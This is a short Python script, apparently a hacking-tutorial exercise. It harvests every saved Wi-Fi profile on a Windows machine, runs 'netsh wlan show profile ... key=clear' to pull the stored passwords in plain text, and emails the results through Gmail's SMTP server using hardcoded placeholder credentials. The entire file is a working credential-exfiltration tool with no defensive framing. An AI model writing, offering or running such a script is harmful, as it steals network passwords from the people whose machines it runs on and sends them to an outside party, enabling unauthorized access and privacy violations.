#!/usr/bin/env python3

import subprocess
import smtplib
import re

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True, universal_newlines=True)

networks_names_list = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

result = ""
for network_name in networks_names_list:
    command = f"netsh wlan show profile {network_name} key=clear"
    current_result = subprocess.check_output(command, shell=True, universal_newlines=True)
    result += current_result

send_mail("john@gmail.com", "abc123", result)